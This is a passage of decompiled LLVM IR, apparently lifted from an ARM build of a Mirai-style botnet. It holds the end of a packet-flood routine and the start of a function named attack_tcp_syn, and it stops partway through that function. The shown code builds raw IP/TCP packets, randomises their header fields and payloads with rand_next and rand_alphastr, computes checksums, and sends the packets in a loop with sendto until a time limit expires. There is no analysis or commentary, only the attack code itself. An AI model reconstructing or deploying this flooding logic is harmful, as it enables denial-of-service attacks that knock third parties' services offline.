dec_label_pc_c078:                                ; preds = %dec_label_pc_c078.preheader, %dec_label_pc_c2b4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i1 %v2_be38, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_be38, label %dec_label_pc_c2b4, label %dec_label_pc_c08c

dec_label_pc_c08c:                                ; preds = %dec_label_pc_c078
  %v0_c08c = load i32, i32* @r8, align 4
  %v3_c08c = mul i32 %v0_c08c, 65536
  %v1_c090 = add i32 %v3_c08c, 1310720
  store i32 %v1_c090, i32* %r2.global-to-local, align 4
  %tmp69 = udiv i32 %v1_c090, 256
  %v3_c098 = and i32 %tmp69, 65280
  store i32 %v3_c098, i32* %r3.global-to-local, align 4
  %v4_c09c = udiv i32 %v1_c090, 16777216
  %v5_c09c = or i32 %v3_c098, %v4_c09c
  store i32 %v5_c09c, i32* @fp, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_c0a4 = add i32 %v0_c08c, 20
  store i32 %v1_c0a4, i32* @sb, align 4
  %v1_c0a8 = add i32 %v0_c08c, 40
  store i32 %v1_c0a8, i32* @sl, align 4
  br label %dec_label_pc_c194

dec_label_pc_c0b0:                                ; preds = %dec_label_pc_c194
  store i32 %v6_bdbc, i32* %r0.global-to-local, align 4
  store i1 %v7_c0b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c0b4, label %dec_label_pc_c218, label %dec_label_pc_c0bc

dec_label_pc_c0bc:                                ; preds = %dec_label_pc_c1b8, %dec_label_pc_c0b0
  store i32 %v3_be2c, i32* %r1.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_c228, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_c228, label %dec_label_pc_c234, label %dec_label_pc_c0d0

dec_label_pc_c0d0:                                ; preds = %dec_label_pc_c218.dec_label_pc_c0d0_crit_edge, %dec_label_pc_c0bc
  %v1_c0d4 = phi i32 [ %v1_c0d4.pre, %dec_label_pc_c218.dec_label_pc_c0d0_crit_edge ], [ 65535, %dec_label_pc_c0bc ]
  store i32 %v3_be30, i32* %r2.global-to-local, align 4
  %v9_c0d4 = icmp eq i32 %v3_be30, %v1_c0d4
  store i1 %v9_c0d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c0d4, label %dec_label_pc_c248, label %dec_label_pc_c0dc

dec_label_pc_c0dc:                                ; preds = %dec_label_pc_c234.dec_label_pc_c0dc_crit_edge, %dec_label_pc_c0d0
  %v1_c0e0 = phi i32 [ %v1_c0e0.pre, %dec_label_pc_c234.dec_label_pc_c0dc_crit_edge ], [ %v1_c0d4, %dec_label_pc_c0d0 ]
  store i32 %v3_be34, i32* %r3.global-to-local, align 4
  %v9_c0e0 = icmp eq i32 %v3_be34, %v1_c0e0
  store i1 %v9_c0e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c0e0, label %dec_label_pc_c25c, label %dec_label_pc_c0e8

dec_label_pc_c0e8:                                ; preds = %dec_label_pc_c248.dec_label_pc_c0e8_crit_edge, %dec_label_pc_c0dc
  %v1_c0ec = phi i32 [ %v1_c0ec.pre, %dec_label_pc_c248.dec_label_pc_c0e8_crit_edge ], [ %v1_c0e0, %dec_label_pc_c0dc ]
  store i32 %v5_bcbc, i32* %ip.global-to-local, align 4
  %v9_c0ec = icmp eq i32 %v5_bcbc, %v1_c0ec
  store i1 %v9_c0ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c0ec, label %dec_label_pc_c270, label %dec_label_pc_c0f4

dec_label_pc_c0f4:                                ; preds = %dec_label_pc_c25c.dec_label_pc_c0f4_crit_edge, %dec_label_pc_c0e8
  %v1_c0f8 = phi i32 [ %v1_c0f8.pre, %dec_label_pc_c25c.dec_label_pc_c0f4_crit_edge ], [ %v1_c0ec, %dec_label_pc_c0e8 ]
  store i32 %v6_bcd8, i32* %r0.global-to-local, align 4
  %v9_c0f8 = icmp eq i32 %v6_bcd8, %v1_c0f8
  store i1 %v9_c0f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c0f8, label %dec_label_pc_c284, label %dec_label_pc_c100

dec_label_pc_c100:                                ; preds = %dec_label_pc_c270, %dec_label_pc_c0f4
  store i32 %v1_bda8, i32* %r1.global-to-local, align 4
  store i1 %v2_c28c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c28c, label %dec_label_pc_c10c, label %dec_label_pc_c298

dec_label_pc_c10c:                                ; preds = %dec_label_pc_c100, %dec_label_pc_c284, %dec_label_pc_c298
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_c110 = load i32, i32* @r5, align 4
  %v3_c110 = add i32 %v2_c110, 10
  %v4_c110 = inttoptr i32 %v3_c110 to i16*
  store i16 0, i16* %v4_c110, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_c118 = load i32, i32* @r5, align 4
  store i32 %v0_c118, i32* @r0, align 4
  %v2_c11c = call i32 @checksum_generic(i32 %v0_c118, i32 20)
  %v3_c11c = trunc i32 %v2_c11c to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_c124 = load i32, i32* @r5, align 4
  %v4_c124 = add i32 %v3_c124, 10
  %v5_c124 = inttoptr i32 %v4_c124 to i16*
  store i16 %v3_c11c, i16* %v5_c124, align 2
  %v0_c128 = load i32, i32* @r6, align 4
  store i32 %v0_c128, i32* @r1, align 4
  %v0_c12c = load i32, i32* %r3.global-to-local, align 4
  %v1_c12c = trunc i32 %v0_c12c to i16
  %v3_c12c = add i32 %v0_c128, 16
  %v4_c12c = inttoptr i32 %v3_c12c to i16*
  store i16 %v1_c12c, i16* %v4_c12c, align 2
  %v0_c130 = load i32, i32* @fp, align 4
  store i32 %v0_c130, i32* %r2.global-to-local, align 4
  %v0_c134 = load i32, i32* @sb, align 4
  store i32 %v0_c134, i32* %r3.global-to-local, align 4
  %v0_c138 = load i32, i32* @r5, align 4
  store i32 %v0_c138, i32* %r0.global-to-local, align 4
  %v4_c13c = call i32 @checksum_tcpudp(i32 %v0_c138, i32 %v0_c128, i32 %v0_c130, i32 %v0_c134)
  %v5_c13c = trunc i32 %v4_c13c to i16
  store i32 %v4_c13c, i32* %r0.global-to-local, align 4
  %v3_c140 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c140, i32* %r3.global-to-local, align 4
  %v3_c144 = mul i32 %v3_c140, 32
  store i32 %v3_c144, i32* %lr.global-to-local, align 4
  %v3_c148 = load i32, i32* @r6, align 4
  %v4_c148 = add i32 %v3_c148, 16
  %v5_c148 = inttoptr i32 %v4_c148 to i16*
  store i16 %v5_c13c, i16* %v5_c148, align 2
  %v0_c14c = load i32, i32* %lr.global-to-local, align 4
  %v1_c14c = load i32, i32* %r3.global-to-local, align 4
  %tmp73 = mul i32 %v1_c14c, -8
  %v5_c14c = add i32 %v0_c14c, %tmp73
  store i32 %v5_c14c, i32* %lr.global-to-local, align 4
  %v0_c150 = load i32, i32* @r6, align 4
  %v1_c150 = add i32 %v0_c150, 2
  %v2_c150 = inttoptr i32 %v1_c150 to i16*
  %v3_c150 = load i16, i16* %v2_c150, align 2
  %v4_c150 = zext i16 %v3_c150 to i32
  store i32 %v4_c150, i32* @r6, align 4
  %v1_c154 = load i32, i32* @r7, align 4
  %v2_c154 = add i32 %v1_c154, %v5_c14c
  store i32 %v2_c154, i32* @lr, align 4
  %v3_c158 = add i32 %v2_c154, 2
  %v4_c158 = inttoptr i32 %v3_c158 to i16*
  store i16 %v3_c150, i16* %v4_c158, align 2
  store i32 16, i32* %ip.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_c164 = load i32, i32* @r5, align 4
  store i32 %v0_c164, i32* %r1.global-to-local, align 4
  store i32 %v3_bde0, i32* %r0.global-to-local, align 4
  %v0_c16c = load i32, i32* @sl, align 4
  store i32 %v0_c16c, i32* %r2.global-to-local, align 4
  %v0_c174 = load i32, i32* @lr, align 4
  %v6_c178 = call i32 @__libc_sendto(i32 %v3_bde0, i32 %v0_c164, i32 %v0_c16c, i32 16384, i32 %v0_c174, i32 16)
  %v3_c17c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c17c, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  %v1_c184 = add i32 %v3_c17c, 1
  store i32 %v1_c184, i32* %r0.global-to-local, align 4
  %v9_c188 = icmp eq i32 %v1_c184, %arg2
  store i1 %v9_c188, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c184, i32* %stack_var_-44, align 4
  %v6_c190 = icmp slt i32 %v1_c184, %arg2
  br i1 %v6_c190, label %dec_label_pc_c194, label %dec_label_pc_c2b4

dec_label_pc_c194:                                ; preds = %dec_label_pc_c10c, %dec_label_pc_c08c
  %v1_c1a8 = phi i32 [ %v1_c184, %dec_label_pc_c10c ], [ 0, %dec_label_pc_c08c ]
  %v5_c198 = mul i32 %v1_c1a8, 24
  %v1_c19c = load i32, i32* @r7, align 4
  %v2_c19c = add i32 %v1_c19c, %v5_c198
  store i32 %v2_c19c, i32* %r3.global-to-local, align 4
  store i32 %v2_bbec, i32* %ip.global-to-local, align 4
  %v1_c1a4 = add i32 %v2_c19c, 20
  %v2_c1a4 = inttoptr i32 %v1_c1a4 to i8*
  %v3_c1a4 = load i8, i8* %v2_c1a4, align 1
  %v4_c1a4 = zext i8 %v3_c1a4 to i32
  store i32 %v4_c1a4, i32* %r2.global-to-local, align 4
  %v4_c1a8 = mul i32 %v1_c1a8, 4
  %v5_c1a8 = add i32 %v4_c1a8, %v2_bbec
  %v6_c1a8 = inttoptr i32 %v5_c1a8 to i32*
  %v7_c1a8 = load i32, i32* %v6_c1a8, align 4
  store i32 %v7_c1a8, i32* @r5, align 4
  %v2_c1ac = icmp ugt i8 %v3_c1a4, 30
  %v7_c1ac = icmp eq i8 %v3_c1a4, 31
  store i1 %v7_c1ac, i1* %cpsr_z.global-to-local, align 1
  %v1_c1b0 = add i32 %v7_c1a8, 20
  store i32 %v1_c1b0, i32* @r6, align 4
  %v2_c1b4 = xor i1 %v7_c1ac, true
  %v3_c1b4 = and i1 %v2_c1ac, %v2_c1b4
  br i1 %v3_c1b4, label %dec_label_pc_c0b0, label %dec_label_pc_c1b8

dec_label_pc_c1b8:                                ; preds = %dec_label_pc_c194
  %v1_c1b8 = add i32 %v2_c19c, 16
  %v2_c1b8 = inttoptr i32 %v1_c1b8 to i32*
  %v3_c1b8 = load i32, i32* %v2_c1b8, align 4
  %v0_c1bc = call i32 @rand_next()
  store i32 %v0_c1bc, i32* %r0.global-to-local, align 4
  %v3_c1c0 = load i32, i32* %stack_var_-44, align 4
  %v5_c1c8 = mul i32 %v3_c1c0, 24
  %v1_c1cc = and i32 %v3_c1b8, 16711680
  store i32 %v1_c1cc, i32* %ip.global-to-local, align 4
  %v3_c1d0 = udiv i32 %v3_c1b8, 16777216
  %v4_c1d4 = udiv i32 %v1_c1cc, 256
  %v5_c1d4 = or i32 %v4_c1d4, %v3_c1d0
  store i32 %v5_c1d4, i32* %r2.global-to-local, align 4
  %v1_c1d8 = load i32, i32* @r7, align 4
  %v2_c1d8 = add i32 %v1_c1d8, %v5_c1c8
  store i32 %v2_c1d8, i32* %r1.global-to-local, align 4
  %v1_c1dc = and i32 %v3_c1b8, 65280
  store i32 %v1_c1dc, i32* %r3.global-to-local, align 4
  %v1_c1e0 = add i32 %v2_c1d8, 20
  %v2_c1e0 = inttoptr i32 %v1_c1e0 to i8*
  %v3_c1e0 = load i8, i8* %v2_c1e0, align 1
  %v4_c1e0 = zext i8 %v3_c1e0 to i32
  store i32 %v4_c1e0, i32* %ip.global-to-local, align 4
  %v5_c1e8 = call i32 @llvm.bswap.i32(i32 %v3_c1b8)
  %v7_c1ec = lshr i32 %v0_c1bc, %v4_c1e0
  %v8_c1ec = add i32 %v7_c1ec, %v5_c1e8
  store i32 %v8_c1ec, i32* %r2.global-to-local, align 4
  %v1_c1fc = and i32 %v8_c1ec, 65280
  store i32 %v1_c1fc, i32* %r1.global-to-local, align 4
  store i32 %v6_bdbc, i32* %r0.global-to-local, align 4
  %v5_c208 = call i32 @llvm.bswap.i32(i32 %v8_c1ec)
  store i32 %v5_c208, i32* %r3.global-to-local, align 4
  store i1 %v7_c0b4, i1* %cpsr_z.global-to-local, align 1
  %v1_c210 = load i32, i32* @r5, align 4
  %v2_c210 = add i32 %v1_c210, 16
  %v3_c210 = inttoptr i32 %v2_c210 to i32*
  store i32 %v5_c208, i32* %v3_c210, align 4
  br i1 %v2_c0b4, label %dec_label_pc_c218, label %dec_label_pc_c0bc

dec_label_pc_c218:                                ; preds = %dec_label_pc_c1b8, %dec_label_pc_c0b0
  %v0_c218 = call i32 @rand_next()
  store i32 %v0_c218, i32* %r0.global-to-local, align 4
  store i32 %v3_be2c, i32* %r1.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_c228, i1* %cpsr_z.global-to-local, align 1
  %v1_c22c = load i32, i32* @r5, align 4
  %v2_c22c = add i32 %v1_c22c, 12
  %v3_c22c = inttoptr i32 %v2_c22c to i32*
  store i32 %v0_c218, i32* %v3_c22c, align 4
  br i1 %v3_c228, label %dec_label_pc_c234, label %dec_label_pc_c218.dec_label_pc_c0d0_crit_edge

dec_label_pc_c218.dec_label_pc_c0d0_crit_edge:    ; preds = %dec_label_pc_c218
  %v1_c0d4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c0d0

dec_label_pc_c234:                                ; preds = %dec_label_pc_c218, %dec_label_pc_c0bc
  %v0_c234 = call i32 @rand_next()
  %v1_c234 = trunc i32 %v0_c234 to i16
  store i32 %v0_c234, i32* %r0.global-to-local, align 4
  store i32 %v3_be30, i32* %r2.global-to-local, align 4
  %v1_c23c = load i32, i32* @r4, align 4
  %v9_c23c = icmp eq i32 %v3_be30, %v1_c23c
  store i1 %v9_c23c, i1* %cpsr_z.global-to-local, align 1
  %v3_c240 = load i32, i32* @r5, align 4
  %v4_c240 = add i32 %v3_c240, 4
  %v5_c240 = inttoptr i32 %v4_c240 to i16*
  store i16 %v1_c234, i16* %v5_c240, align 2
  br i1 %v9_c23c, label %dec_label_pc_c248, label %dec_label_pc_c234.dec_label_pc_c0dc_crit_edge

dec_label_pc_c234.dec_label_pc_c0dc_crit_edge:    ; preds = %dec_label_pc_c234
  %v1_c0e0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c0dc

dec_label_pc_c248:                                ; preds = %dec_label_pc_c234, %dec_label_pc_c0d0
  %v0_c248 = call i32 @rand_next()
  %v1_c248 = trunc i32 %v0_c248 to i16
  store i32 %v0_c248, i32* %r0.global-to-local, align 4
  store i32 %v3_be34, i32* %r3.global-to-local, align 4
  %v1_c250 = load i32, i32* @r4, align 4
  %v9_c250 = icmp eq i32 %v3_be34, %v1_c250
  store i1 %v9_c250, i1* %cpsr_z.global-to-local, align 1
  %v3_c254 = load i32, i32* @r5, align 4
  %v4_c254 = add i32 %v3_c254, 20
  %v5_c254 = inttoptr i32 %v4_c254 to i16*
  store i16 %v1_c248, i16* %v5_c254, align 2
  br i1 %v9_c250, label %dec_label_pc_c25c, label %dec_label_pc_c248.dec_label_pc_c0e8_crit_edge

dec_label_pc_c248.dec_label_pc_c0e8_crit_edge:    ; preds = %dec_label_pc_c248
  %v1_c0ec.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c0e8

dec_label_pc_c25c:                                ; preds = %dec_label_pc_c248, %dec_label_pc_c0dc
  %v0_c25c = call i32 @rand_next()
  %v1_c25c = trunc i32 %v0_c25c to i16
  store i32 %v0_c25c, i32* %r0.global-to-local, align 4
  store i32 %v5_bcbc, i32* %ip.global-to-local, align 4
  %v1_c264 = load i32, i32* @r4, align 4
  %v9_c264 = icmp eq i32 %v5_bcbc, %v1_c264
  store i1 %v9_c264, i1* %cpsr_z.global-to-local, align 1
  %v3_c268 = load i32, i32* @r6, align 4
  %v4_c268 = add i32 %v3_c268, 2
  %v5_c268 = inttoptr i32 %v4_c268 to i16*
  store i16 %v1_c25c, i16* %v5_c268, align 2
  br i1 %v9_c264, label %dec_label_pc_c270, label %dec_label_pc_c25c.dec_label_pc_c0f4_crit_edge

dec_label_pc_c25c.dec_label_pc_c0f4_crit_edge:    ; preds = %dec_label_pc_c25c
  %v1_c0f8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c0f4

dec_label_pc_c270:                                ; preds = %dec_label_pc_c25c, %dec_label_pc_c0e8
  %v0_c270 = call i32 @rand_next()
  %v1_c274 = load i32, i32* @r6, align 4
  %v2_c274 = add i32 %v1_c274, 4
  %v3_c274 = inttoptr i32 %v2_c274 to i32*
  store i32 %v0_c270, i32* %v3_c274, align 4
  store i32 %v6_bcd8, i32* %r0.global-to-local, align 4
  %v1_c27c = load i32, i32* @r4, align 4
  %v9_c27c = icmp eq i32 %v6_bcd8, %v1_c27c
  store i1 %v9_c27c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c27c, label %dec_label_pc_c284, label %dec_label_pc_c100

dec_label_pc_c284:                                ; preds = %dec_label_pc_c270, %dec_label_pc_c0f4
  %v0_c284 = call i32 @rand_next()
  store i32 %v0_c284, i32* %r0.global-to-local, align 4
  store i32 %v1_bda8, i32* %r1.global-to-local, align 4
  store i1 %v2_c28c, i1* %cpsr_z.global-to-local, align 1
  %v1_c290 = load i32, i32* @r6, align 4
  %v2_c290 = add i32 %v1_c290, 8
  %v3_c290 = inttoptr i32 %v2_c290 to i32*
  store i32 %v0_c284, i32* %v3_c290, align 4
  br i1 %v2_c28c, label %dec_label_pc_c10c, label %dec_label_pc_c298

dec_label_pc_c298:                                ; preds = %dec_label_pc_c100, %dec_label_pc_c284
  %v0_c298 = load i32, i32* @r5, align 4
  %v1_c298 = add i32 %v0_c298, 40
  store i32 %v1_c298, i32* @r4, align 4
  store i32 %v1_c298, i32* %r0.global-to-local, align 4
  %v0_c2a0 = load i32, i32* @r8, align 4
  store i32 %v0_c2a0, i32* %r1.global-to-local, align 4
  %v2_c2a4 = call i32 @rand_alphastr(i32 %v1_c298, i32 %v0_c2a0)
  store i32 %v2_c2a4, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c2ac = load i32, i32* @r4, align 4
  %v3_c2ac = load i32, i32* @r8, align 4
  %v4_c2ac = add i32 %v3_c2ac, %v2_c2ac
  %v5_c2ac = inttoptr i32 %v4_c2ac to i8*
  store i8 0, i8* %v5_c2ac, align 1
  br label %dec_label_pc_c10c

dec_label_pc_c2b4:                                ; preds = %dec_label_pc_c10c, %dec_label_pc_c078
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_c2b8 = call i32 @__GI_time(i32* null)
  store i32 %v2_c2b8, i32* %r0.global-to-local, align 4
  store i32 %v2_bdcc, i32* %r1.global-to-local, align 4
  %v9_c2c0 = icmp eq i32 %v2_bdcc, %v2_c2b8
  store i1 %v9_c2c0, i1* %cpsr_z.global-to-local, align 1
  %v6_c2c4 = icmp slt i32 %v2_bdcc, %v2_c2b8
  br i1 %v6_c2c4, label %dec_label_pc_c2c8, label %dec_label_pc_c078

dec_label_pc_c2c8:                                ; preds = %dec_label_pc_c2b4, %entry, %dec_label_pc_c2d4
  %v1_c2d0 = phi i32 [ %v3_bde0, %entry ], [ %v1_c2d8, %dec_label_pc_c2d4 ], [ %v2_c2b8, %dec_label_pc_c2b4 ]
  store i32 %v18_bbc0, i32* %sb.global-to-local, align 4
  store i32 %v24_bbc0, i32* %fp.global-to-local, align 4
  store i32 %v27_bbc0, i32* %lr.global-to-local, align 4
  ret i32 %v1_c2d0

dec_label_pc_c2d4:                                ; preds = %dec_label_pc_bdf0
  store i32 %v3_bde0, i32* %r0.global-to-local, align 4
  %v1_c2d8 = call i32 @__GI___libc_close(i32 %v3_bde0)
  store i32 %v1_c2d8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c2c8

; uselistorder directives
  uselistorder i32 %v1_c2d8, { 1, 0 }
  uselistorder i32 %v0_c25c, { 1, 0 }
  uselistorder i32 %v0_c248, { 1, 0 }
  uselistorder i32 %v0_c234, { 1, 0 }
  uselistorder i32 %v5_c208, { 1, 0 }
  uselistorder i32 %v3_c1b8, { 2, 1, 3, 0 }
  uselistorder i32 %v1_c184, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v5_c14c, { 1, 0 }
  uselistorder i32 %v4_c13c, { 1, 0 }
  uselistorder i32 %v0_c08c, { 2, 1, 0 }
  uselistorder i1 %v2_c28c, { 2, 3, 1, 0 }
  uselistorder i1 %v3_c228, { 1, 0, 2, 3 }
  uselistorder i1 %v7_c0b4, { 2, 1, 0 }
  uselistorder i32 %v1_c064, { 1, 0, 2, 3 }
  uselistorder i32 %v0_c034, { 1, 0 }
  uselistorder i32 %v0_bfa0, { 1, 0, 2, 3 }
  uselistorder i32 %v1_bec8, { 2, 0, 1 }
  uselistorder i32 %v1_bec4, { 2, 0, 1 }
  uselistorder i32 %v1_beb4, { 1, 0 }
  uselistorder i1 %v2_be38, { 1, 0, 2, 3 }
  uselistorder i32 %v3_be2c, { 0, 1, 3, 2 }
  uselistorder i32 %v0_be28, { 1, 0, 3, 2 }
  uselistorder i32 %v0_be24, { 1, 0, 2 }
  uselistorder i1 %v7_be10, { 1, 0 }
  uselistorder i1 %v7_bde4, { 1, 0 }
  uselistorder i32 %v3_bde0, { 3, 4, 1, 5, 6, 2, 0, 7 }
  uselistorder i32 %v2_bdcc, { 2, 1, 0 }
  uselistorder i32 %v6_bdbc, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_bda8, { 2, 1, 3, 4, 0 }
  uselistorder i32 %v6_bd20, { 0, 2, 1 }
  uselistorder i32 %v6_bcd8, { 3, 2, 1, 0 }
  uselistorder i32 %v5_bcbc, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_bc6c, { 1, 0 }
  uselistorder i32 %v1_bc48, { 1, 0 }
  uselistorder i32 %v6_bc40, { 1, 0 }
  uselistorder i32 %v7_bc28, { 1, 0, 2, 3 }
  uselistorder i8 %v5_bc24, { 1, 0 }
  uselistorder i32 %v6_bc04, { 1, 0 }
  uselistorder i32 %v2_bbec, { 0, 4, 1, 3, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 13, 5, 6, 7, 8, 9, 10, 11, 12, 14, 15, 17, 16, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 8, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28, 27, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 41, 40, 42, 43, 44, 45, 47, 46, 49, 48, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 7, 5, 8, 6, 9, 10, 11, 13, 12, 15, 14, 16, 18, 17, 19, 20, 21, 23, 22, 29, 24, 25, 26, 27, 28, 30, 31, 32, 33, 35, 34, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 6, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 16, 8, 9, 10, 11, 12, 13, 14, 15, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32 %arg2, { 6, 5, 4, 7, 3, 2, 1, 0, 8, 9, 10, 11 }
  uselistorder label %dec_label_pc_c2c8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c298, { 1, 0 }
  uselistorder label %dec_label_pc_c10c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_c078, { 1, 0 }
  uselistorder label %.thread10, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @attack_tcp_syn(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_c2e4 = load i32, i32* @r4, align 4
  %v24_c2e4 = load i32, i32* @fp, align 4
  %v27_c2e4 = load i32, i32* @lr, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg5, i32* @r4, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_c310 = call i32 @calloc(i32 %arg2, i32 4)
  %v0_c314 = load i32, i32* @r4, align 4
  store i32 %v0_c314, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_c310, i32* @sl, align 4
  %v0_c324 = load i32, i32* @r5, align 4
  store i32 %v0_c324, i32* %r0.global-to-local, align 4
  %v4_c328 = inttoptr i32 %v0_c314 to i32*
  %v5_c328 = call i32 @attack_get_opt_int(i32 %v0_c324, i32* %v4_c328, i32 2, i32 0)
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_c340 = load i32, i32* @r4, align 4
  store i32 %v0_c340, i32* %r1.global-to-local, align 4
  %v0_c344 = load i32, i32* @r5, align 4
  store i32 %v0_c344, i32* %r0.global-to-local, align 4
  %v5_c348 = trunc i32 %v5_c328 to i8
  %v6_c34c = inttoptr i32 %v0_c340 to i32*
  %v7_c34c = call i32 @attack_get_opt_int(i32 %v0_c344, i32* %v6_c34c, i32 3, i32 65535)
  %v0_c350 = load i32, i32* @r4, align 4
  store i32 %v0_c350, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_c360 = load i32, i32* @r5, align 4
  store i32 %v0_c360, i32* %r0.global-to-local, align 4
  %v5_c364 = inttoptr i32 %v0_c350 to i32*
  %v6_c364 = call i32 @attack_get_opt_int(i32 %v0_c360, i32* %v5_c364, i32 4, i32 64)
  %v1_c36c = urem i32 %v6_c364, 256
  %v0_c370 = load i32, i32* @r4, align 4
  store i32 %v0_c370, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_c37c = load i32, i32* @r5, align 4
  store i32 %v0_c37c, i32* %r0.global-to-local, align 4
  %v6_c384 = inttoptr i32 %v0_c370 to i32*
  %v7_c384 = call i32 @attack_get_opt_int(i32 %v0_c37c, i32* %v6_c384, i32 5, i32 1)
  %v1_c390 = urem i32 %v7_c384, 256
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_c39c = load i32, i32* @r4, align 4
  store i32 %v0_c39c, i32* %r1.global-to-local, align 4
  %v0_c3a0 = load i32, i32* @r5, align 4
  store i32 %v0_c3a0, i32* %r0.global-to-local, align 4
  %v5_c3a8 = inttoptr i32 %v0_c39c to i32*
  %v6_c3a8 = call i32 @attack_get_opt_int(i32 %v0_c3a0, i32* %v5_c3a8, i32 6, i32 65535)
  %v0_c3b4 = load i32, i32* @r4, align 4
  store i32 %v0_c3b4, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_c3c0 = load i32, i32* @r5, align 4
  store i32 %v0_c3c0, i32* %r0.global-to-local, align 4
  %v5_c3c4 = inttoptr i32 %v0_c3b4 to i32*
  %v6_c3c4 = call i32 @attack_get_opt_int(i32 %v0_c3c0, i32* %v5_c3c4, i32 7, i32 65535)
  %v0_c3cc = load i32, i32* @r4, align 4
  store i32 %v0_c3cc, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 %v6_c3c4, i32* %fp.global-to-local, align 4
  %v0_c3dc = load i32, i32* @r5, align 4
  store i32 %v0_c3dc, i32* %r0.global-to-local, align 4
  %v4_c3e0 = inttoptr i32 %v0_c3cc to i32*
  %v5_c3e0 = call i32 @attack_get_opt_int(i32 %v0_c3dc, i32* %v4_c3e0, i32 16, i32 65535)
  %v0_c3e4 = load i32, i32* @r4, align 4
  store i32 %v0_c3e4, i32* %r1.global-to-local, align 4
